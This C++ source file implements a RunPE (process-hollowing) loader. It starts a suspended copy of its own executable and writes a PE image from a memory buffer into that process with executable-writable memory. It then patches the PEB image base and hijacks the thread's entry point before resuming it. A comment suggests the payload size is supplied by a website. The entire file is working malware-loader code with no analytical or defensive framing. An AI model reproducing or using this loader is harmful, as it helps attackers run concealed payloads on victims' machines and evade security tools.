#include "runpe.h"
#include <iostream>
#include <windows.h>
#include <winternl.h>
#include <random>

#pragma comment(lib, "ntdll.lib")

// NTDLL Function Prototypes
typedef NTSTATUS(NTAPI* pNtQueryInformationProcess)(
    HANDLE ProcessHandle,
    PROCESSINFOCLASS ProcessInformationClass,
    PVOID ProcessInformation,
    ULONG ProcessInformationLength,
    PULONG ReturnLength
);

namespace RunPE {

    bool Execute(const std::vector<uint8_t>& memoryBuffer, size_t allocationSize) {
        char hostPath[MAX_PATH];
        GetModuleFileNameA(NULL, hostPath, MAX_PATH);
        
        std::cout << "[RunPE] Spawning self-host: " << hostPath << " --child\n";
        
        std::string commandLine = "\"" + std::string(hostPath) + "\" --child";
        
        PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)memoryBuffer.data();
        if (pDosHeader->e_magic != IMAGE_DOS_SIGNATURE) {
            std::cout << "[-] Invalid DOS Header\n";
            return false;
        }

        PIMAGE_NT_HEADERS64 pNtHeaders = (PIMAGE_NT_HEADERS64)(memoryBuffer.data() + pDosHeader->e_lfanew);
        if (pNtHeaders->Signature != IMAGE_NT_SIGNATURE) {
            std::cout << "[-] Invalid NT Header\n";
            return false;
        }

        STARTUPINFOA si = { sizeof(si) };
        PROCESS_INFORMATION pi = { 0 };

        if (!CreateProcessA(NULL, (LPSTR)commandLine.c_str(), NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
            std::cout << "[-] Failed to create host process (Error: " << GetLastError() << ")\n";
            return false;
        }

        CONTEXT ctx = { 0 };
        ctx.ContextFlags = CONTEXT_FULL;
        if (!GetThreadContext(pi.hThread, &ctx)) {
            std::cout << "[-] Failed to get thread context\n";
            TerminateProcess(pi.hProcess, 0);
            return false;
        }

        // Use the allocation size from the website for padding
        size_t finalSize = (allocationSize > pNtHeaders->OptionalHeader.SizeOfImage) ? allocationSize : pNtHeaders->OptionalHeader.SizeOfImage;
        
        LPVOID pRemoteImage = VirtualAllocEx(pi.hProcess, (LPVOID)pNtHeaders->OptionalHeader.ImageBase, finalSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
        
        if (!pRemoteImage) {
            std::cout << "[*] ImageBase mismatch, performing rebase allocation...\n";
            pRemoteImage = VirtualAllocEx(pi.hProcess, NULL, finalSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
        }

        if (!pRemoteImage) {
            std::cout << "[-] VirtualAllocEx failed\n";
            TerminateProcess(pi.hProcess, 0);
            return false;
        }

        // Write headers
        if (!WriteProcessMemory(pi.hProcess, pRemoteImage, memoryBuffer.data(), pNtHeaders->OptionalHeader.SizeOfHeaders, NULL)) {
            std::cout << "[-] Failed to write headers\n";
            TerminateProcess(pi.hProcess, 0);
            return false;
        }

        // Write sections
        PIMAGE_SECTION_HEADER pSectionHeader = IMAGE_FIRST_SECTION(pNtHeaders);
        for (int i = 0; i < pNtHeaders->FileHeader.NumberOfSections; i++) {
            LPVOID pDest = (LPVOID)((uintptr_t)pRemoteImage + pSectionHeader[i].VirtualAddress);
            LPVOID pSrc = (LPVOID)(memoryBuffer.data() + pSectionHeader[i].PointerToRawData);
            
            if (!WriteProcessMemory(pi.hProcess, pDest, pSrc, pSectionHeader[i].SizeOfRawData, NULL)) {
                std::cout << "[-] Failed to write section: " << pSectionHeader[i].Name << "\n";
                TerminateProcess(pi.hProcess, 0);
                return false;
            }
        }

        // Update ImageBase in PEB
        // x64: PEB is at [rdx + 0x10] (actually [ctx.Rdx + 0x10] on some older but usually PEB is in RDX or retrieved via NtQuery)
        // More robust: Read PEB from ctx.Rdx (it's the second arg to entry point, but let's use the offset)
        WriteProcessMemory(pi.hProcess, (LPVOID)(ctx.Rdx + 0x10), &pRemoteImage, sizeof(LPVOID), NULL);

        // Hijack entry point
        ctx.Rcx = (uintptr_t)pRemoteImage + pNtHeaders->OptionalHeader.AddressOfEntryPoint;
        
        if (!SetThreadContext(pi.hThread, &ctx)) {
            std::cout << "[-] Failed to set thread context\n";
            TerminateProcess(pi.hProcess, 0);
            return false;
        }

        std::cout << "[RunPE] Successfully mapped. Resuming thread...\n";
        ResumeThread(pi.hThread);

        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        
        return true;
    }
}
